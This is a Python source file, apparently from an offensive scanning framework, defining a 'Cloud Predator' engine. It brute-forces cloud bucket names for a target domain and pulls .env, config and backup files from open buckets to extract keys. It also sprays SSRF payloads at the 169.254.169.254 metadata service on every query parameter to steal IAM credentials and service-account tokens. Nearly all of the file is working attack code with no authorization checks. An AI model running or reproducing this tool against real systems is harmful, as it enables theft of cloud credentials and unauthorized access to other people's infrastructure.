import asyncio
import re
import aiohttp
import httpx
from typing import List, Dict, Any
from rich.console import Console
import xml.etree.ElementTree as ET
from aura.core.storage import AuraStorage
from aura.core.brain import AuraBrain

from aura.ui.formatter import console
from aura.core.engine_base import AbstractEngine

class AuraCloudRecon(AbstractEngine):
    """
    v15.0: THE CLOUD PREDATOR
    Automated Discovery of Leaky Buckets & Cloud Assets (v19.4: Full async rewrite)
    """
    ENGINE_ID = "aura_cloud_recon"
    
    def __init__(self, *args, **kwargs):
        super().__init__()
        self.storage = kwargs.get("persistence") or kwargs.get("storage")
        self.brain = kwargs.get("brain") or AuraBrain()
        self.secret_patterns = {
            "AWS Key": r"AKIA[A-Z0-9]{16}",
            "AWS Secret": r"wJalrXUtnFEMI/K7MDENG/bPxRfiCY[a-zA-Z0-9+/]{8}", # Generic pattern
            "Private Key": r"-----BEGIN [A-Z ]+ PRIVATE KEY-----",
            "General API Key": r"(?i)(api_key|secret|token|password|pw)\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{16,})['\"]"
        }

    async def run(self):
        """Standard run method as required by AbstractEngine."""
        if self.context and self.context.target_url:
            await self.hunt(self.context.target_url)
        return []

    async def hunt(self, domain: str):
        """Main entry point to scan for cloud assets related to a domain."""
        console.print(f"[bold cyan][*] Cloud Predator: Starting hunt on {domain}[/bold cyan]")
        base_name = domain.split('.')[0]
        
        # 1. Advanced intelligent permutations
        suffixes = ["data", "backup", "prod", "production", "dev", "development", 
                    "staging", "assets", "media", "logs", "test", "v1", "v2", "api", "static", "images"]
        prefixes = ["s3-", "cloud-", "bucket-", "www-", "app-"]
        
        seeds = [base_name, domain.replace(".", "-"), domain]
        for s in suffixes:
            seeds.append(f"{base_name}-{s}")
            seeds.append(f"{base_name}_{s}")
            seeds.append(f"{s}-{base_name}")
        for p in prefixes:
            seeds.append(f"{p}{base_name}")
            seeds.append(f"{p}{domain.replace('.', '-')}")
            
        # Deduplicate
        seeds = list(set(seeds))
        console.print(f"[dim cyan]  [+] Generated {len(seeds)} permutations for bucket brute-forcing...[/dim cyan]")

        # Run all cloud checks concurrently with limits
        await asyncio.gather(
            self._check_aws_s3(seeds, domain),
            self._check_gcp_buckets(seeds, domain),
            self._inject_ssrf_metadata(domain),
            return_exceptions=True
        )
        console.print(f"[dim cyan][*] Cloud Extractor: Hunt complete for {domain}[/dim cyan]")

    async def _check_aws_s3(self, seeds: list, domain: str):
        """Check for publicly accessible AWS S3 buckets (async)."""
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            for seed in seeds:
                url = f"https://{seed}.s3.amazonaws.com"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=7)) as r:
                        if r.status == 200:
                            self._log_cloud_asset(domain, url, "AWS S3 Bucket", "Publicly Accessible (200 OK)")
                            await self._inspect_bucket(url, domain, "AWS S3 Bucket")
                except Exception:
                    pass

    async def _check_gcp_buckets(self, seeds: list, domain: str):
        """Check for Google Cloud Storage Buckets (async)."""
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            for seed in seeds:
                url = f"https://storage.googleapis.com/{seed}"
                try:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=7)) as r:
                        # 403 on GCP sometimes leaks project info, but 200 is pure public
                        if r.status == 200:
                            self._log_cloud_asset(domain, url, "GCP Bucket", "Publicly Accessible (200 OK)")
                            await self._inspect_bucket(url, domain, "GCP Bucket")
                except Exception:
                    pass

    async def _inject_ssrf_metadata(self, domain: str):
        """Massively injects 169.254.169.254 into all intel endpoint query params."""
        intel = self.context.get_intel() if self.context and hasattr(self.context, "get_intel") else {}
        urls = intel.get("urls", set())
        if not urls: return
        
        # Limit to 30 endpoints targeting parameters
        param_urls = [u for u in urls if "?" in u or "=" in u][:30]
        if not param_urls: return
        
        metadatas = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
        ]
        
        console.print(f"[dim cyan]  [+] Spraying SSRF Cloud-Metadata payloads on {len(param_urls)} endpoints...[/dim cyan]")
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for u in param_urls:
                import urllib.parse
                parsed = urllib.parse.urlparse(u)
                qs = urllib.parse.parse_qs(parsed.query)
                
                # Replace every parameter with a metadata payload
                for meta in metadatas:
                    mutated_qs = {k: meta for k in qs}
                    enc_qs = urllib.parse.urlencode(mutated_qs, doseq=True)
                    target = urllib.parse.urlunparse(parsed._replace(query=enc_qs))
                    
                    try:
                        headers = {"Metadata-Flavor": "Google"} # Bypass GCP header checks
                        resp = await client.get(target, headers=headers)
                        body = resp.text
                        if resp.status_code == 200 and ("AccessKeyId" in body or "access_token" in body):
                            console.print(f"[bold red][☠️ SSRF] Cloud Metadata Exfiltration Successful at {target}[/bold red]")
                            if self.storage:
                                self.storage.add_finding(
                                    target_value=domain,
                                    content="SSRF Metadata Exfiltration",
                                    finding_type="CRITICAL SSRF / Metadata Leak",
                                    proof=f"IAM Token Leaked: {body[:150]}"
                                )
                    except: pass

    async def _inspect_bucket(self, url: str, domain: str, asset_type: str):
        """Deeply audits a public bucket for sensitive files and secrets."""
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            try:
                resp = await client.get(url)
                if resp.status_code == 200:
                    files = self._parse_s3_xml(resp.text)
                    console.print(f"[green]  [+] {asset_type} listable: {len(files)} files discovered.[/green]")
                    
                    # Target top 20 files for secret scanning (focusing on .env, .git, config, backup)
                    targets = [f for f in files if any(ext in f.lower() for ext in ['.env', '.git', 'config', 'backup', 'secret', 'key', '.sql', '.yaml', '.json'])]
                    
                    for f_key in targets[:10]:
                        f_url = f"{url}/{f_key}" if not url.endswith('/') else f"{url}{f_key}"
                        await self._scan_file_for_secrets(f_url, domain)
                        
            except Exception as e:
                pass

    async def _scan_file_for_secrets(self, file_url: str, domain: str):
        """Scans a specific file for high-entropy secrets and patterns."""
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            try:
                # Use Range header to only pull first 512KB for performance
                resp = await client.get(file_url, headers={"Range": "bytes=0-512000"})
                if resp.status_code in [200, 206]:
                    content = resp.text
                    for name, pattern in self.secret_patterns.items():
                        matches = re.findall(pattern, content)
                        if matches:
                            evidence = f"LEAKED SECRET [{name}] found in {file_url}"
                            console.print(f"[bold red][!] {evidence}[/bold red]")
                            self.storage.add_finding(
                                target_value=domain,
                                content=evidence,
                                finding_type="Cloud Secret Exposure",
                                proof=f"Match: {matches[0]}..."
                            )
            except:
                pass

    def _parse_s3_xml(self, xml_content: str) -> List[str]:
        """Parses S3 XML and returns a list of file keys."""
        files = []
        try:
            root = ET.fromstring(xml_content)
            # Support both namespaced and non-namespaced XML
            ns_url = 'http://s3.amazonaws.com/doc/2006-03-01/'
            ns = {'s3': ns_url}
            
            # Try with namespace
            items = root.findall('.//s3:Contents', ns)
            if not items:
                # Try without namespace
                items = root.findall('.//Contents')
                
            for content in items:
                # Handle cases with and without prefix
                key_node = content.find('s3:Key', ns) if items and 's3' in ns else content.find('Key')
                if key_node is not None:
                    files.append(key_node.text)
        except:
            pass
        return files

    def _log_cloud_asset(self, domain: str, url: str, asset_type: str, status: str):
        """Logs identified asset to storage."""
        console.print(f"[bold red][!!!] CLOUD ASSET FOUND: [{asset_type}] {url} | {status}[/bold red]")
        try:
            self.storage.log_action(
                action=f"CLOUD_ASSET_FOUND:{asset_type}",
                target=domain,
                details=f"URL={url} Status={status}"
            )
            if "Accessible (200 OK)" in status:
                self.storage.add_finding(
                    target_value=domain,
                    content=f"Exposed {asset_type}: {url}",
                    finding_type="Cloud Security Misconfiguration",
                    proof=f"HTTP 200 on {url}"
                )
        except Exception as e:
            console.print(f"[dim red][!] Cloud storage log error: {e}[/dim red]")
